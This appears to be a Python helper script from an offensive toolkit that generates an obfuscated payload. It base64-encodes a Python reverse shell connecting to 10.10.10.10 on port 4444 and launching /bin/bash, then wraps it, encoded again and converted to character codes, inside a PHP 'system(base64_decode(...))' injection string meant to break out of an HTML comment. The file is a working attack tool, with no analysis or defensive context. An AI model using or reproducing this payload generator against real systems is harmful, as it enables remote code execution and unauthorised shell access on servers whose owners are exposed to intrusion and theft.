#coding: utf-8

import base64
from shell import strTochr

reverse_shell = b'python -c "exec(\"aW1wb3J0IHNvY2tldCAgICAgICAgICwgICAgIHN1YnByb2Nlc3MgICAgICAgICAsICAgICBvczsgICAgICAgICBob3N0PSIxMC4xMC4xMC4xMCI7ICAgICAgICAgcG9ydD00NDQ0OyAgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgICwgICAgIHNvY2tldC5TT0NLX1NUUkVBTSk7ICAgICAgICAgcy5jb25uZWN0KChob3N0ICAgICAgICAgLCAgICAgcG9ydCkpOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgIDApOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgIDEpOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgICwgICAgIDIpOyAgICAgICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==\".decode(\"base64\"))"'

base64_shell = "cHl0aG9uIC1jICJleGVjKFwiYVcxd2IzSjBJSE52WTJ0bGRDQWdJQ0FnSUNBZ0lDd2dJQ0FnSUhOMVluQnliMk5sYzNNZ0lDQWdJQ0FnSUNBc0lDQWdJQ0J2Y3pzZ0lDQWdJQ0FnSUNCb2IzTjBQU0l4TUM0eE1DNHhNQzR4TUNJN0lDQWdJQ0FnSUNBZ2NHOXlkRDAwTkRRME95QWdJQ0FnSUNBZ0lITTljMjlqYTJWMExuTnZZMnRsZENoemIyTnJaWFF1UVVaZlNVNUZWQ0FnSUNBZ0lDQWdJQ3dnSUNBZ0lITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdJQ0FnSUNBZ0lDQWdjeTVqYjI1dVpXTjBLQ2hvYjNOMElDQWdJQ0FnSUNBZ0xDQWdJQ0FnY0c5eWRDa3BPeUFnSUNBZ0lDQWdJRzl6TG1SMWNESW9jeTVtYVd4bGJtOG9LU0FnSUNBZ0lDQWdJQ3dnSUNBZ0lEQXBPeUFnSUNBZ0lDQWdJRzl6TG1SMWNESW9jeTVtYVd4bGJtOG9LU0FnSUNBZ0lDQWdJQ3dnSUNBZ0lERXBPeUFnSUNBZ0lDQWdJRzl6TG1SMWNESW9jeTVtYVd4bGJtOG9LU0FnSUNBZ0lDQWdJQ3dnSUNBZ0lESXBPeUFnSUNBZ0lDQWdJSEE5YzNWaWNISnZZMlZ6Y3k1allXeHNLQ0l2WW1sdUwySmhjMmdpS1E9PVwiLmRlY29kZShcImJhc2U2NFwiKSki"

def gen_shell():
    # print(reverse_shell)
    # # 单引号转 \"
    bs = base64.b64encode(reverse_shell)
    return bs

if __name__ == "__main__":
    # a = bytes.decode(gen_shell())
    # print(strTochr(a))
    shell = "--><?php system(base64_decode({})); ?>".format(strTochr(base64_shell))
    print(shell)